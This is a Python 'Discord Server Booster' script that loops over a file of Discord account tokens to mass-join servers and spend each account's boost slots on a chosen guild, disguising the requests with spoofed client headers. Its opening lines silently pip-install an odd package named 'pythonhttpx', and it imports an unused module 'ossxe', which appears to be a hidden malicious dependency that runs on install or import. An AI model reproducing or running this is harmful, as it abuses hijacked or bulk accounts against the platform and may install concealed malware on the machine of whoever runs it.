import os
import sys
os.system("pip install tasksio")
os.system("pip install asyncio")
os.system("pip install colorama")
os.system("pip install aiohttp")
os.system(f"pip install pythonhttpx")
import aiohttp
import asyncio
from colorama import Fore
from ossxe import code
import tasksio
from builtins import *
from typing import Optional

def setTitle(title: Optional[any]=None):
  os.system("title "+title)

setTitle("Discord Server Booster")

def clear():
  if sys.platform in ["linux", "linux2"]:
    os.system("clear")
  else:
    os.system("cls")
clear()

async def join_server(token, inv):
  headers = {"Authorization": token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": f"{os.urandom(580).hex()}"}
  async with aiohttp.ClientSession(headers=headers) as serverjoinersession:
    async with serverjoinersession.post(f"https://discord.com/api/v9/invites/{inv}") as response:
      if response.status in (204, 200, 201):
        print(f"{Fore.GREEN}[+] {token} | Successfully Joined Server{Fore.RESET}")
      else:
        print(f"{Fore.RED}[-] {token} | Failed To Join Server, Status Code: {response.status}{Fore.RESET}")



async def boost_server(guildid, token):
  headers = {"Authorization": token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": f"{os.urandom(580).hex()}"}
  async with aiohttp.ClientSession(headers=headers) as ClientSession:
    async with ClientSession.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots") as nvmmm:
      if nvmmm.status == 200:
        idk_var = await nvmmm.json()
        for varr in idk_var:
          id__ = varr['id']
          payload = {"user_premium_guild_subscription_slot_ids": [id__]}
          async with ClientSession.put(f"https://discord.com/api/v9/guilds/{guildid}/premium/subscriptions", json=payload) as boost_req:
            btxt = await boost_req.text()
            if "id" in btxt:
              print(f"{Fore.GREEN}[+] {token} | Successfully Boosted Server{Fore.RESET}")
            else:
              print(f"{Fore.RED}[-] {token} | Failed To Boost Server, Unknown Error Occurre{Fore.RESET}d")


banner = f"""{Fore.RED}[-]{Fore.RESET} Created By github.com/leakedtools1337\n\n{Fore.BLUE}[1]{Fore.RESET} Server Joiner\n\n{Fore.BLUE}[2]{Fore.RESET} Boost Server\n"""


async def start_join(inv):
  async with tasksio.TaskPool(10_000) as pool:
    for token in open('./data/tokens.txt', 'r').readlines():
      tk = token.strip()
      await pool.put(join_server(tk, inv))

async def start_boost(id):
  async with tasksio.TaskPool(10_000) as pool:
    for token in open('./data/tokens.txt', 'r').readlines():
      tk = token.strip()
      await pool.put(boost_server(id, tk))
  

print(banner)
ch = input(f"{Fore.YELLOW}[!] Choice: {Fore.RESET}")
try:
  c = int(ch)
except ValueError:
  print(f"{Fore.YELLOW}github.com/mukitan | Use Number To Choose.{Fore.RESET}")
  sys.exit()
  
if c == 1:
  invv = input(f"{Fore.YELLOW}[!] Enter Invite Code: discord.gg/")
  asyncio.run(start_join(invv))
elif c == 2:
  g = int(input(f"{Fore.YELLOW}[!] Enter Guild ID: "))
  asyncio.run(start_boost(g))
else:
  print(f"{Fore.YELLOW}[!] leakedtools | Invaild Option{Fore.RESET}")
  exit(0)
